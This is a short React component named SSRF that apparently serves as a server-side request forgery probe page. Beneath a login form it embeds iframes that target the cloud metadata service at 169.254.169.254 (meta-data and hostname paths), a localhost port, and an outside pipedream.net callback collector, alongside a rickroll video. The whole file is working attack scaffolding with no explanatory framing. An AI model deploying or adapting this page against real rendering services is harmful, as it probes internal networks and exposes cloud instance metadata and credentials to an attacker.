import Login from './LoginForm'

function SSRF() {
  return (
    <>
    <Login />
    <div className=''>
        <iframe src='https://www.youtube.com/embed/dQw4w9WgXcQ' />
        <iframe className='w-lg h-24' src='http://169.254.169.254' />
        <iframe  className='w-lg h-24' src='https://salesblink-delta.vercel.app/' />
        <iframe  className='w-lg h-24' src='http://169.254.169.254/latest/meta-data/' />
        <iframe  className='w-lg h-24' src='http://169.254.169.254/latest/meta-data/hostname' />
        <iframe  className='w-lg h-24' src='http://127.0.0.1:8080/' />
        <iframe  className='w-lg h-24' src='https://eo88cq2x5r57ogc.m.pipedream.net' /> 
    </div>
    </>
  )
}

export default SSRF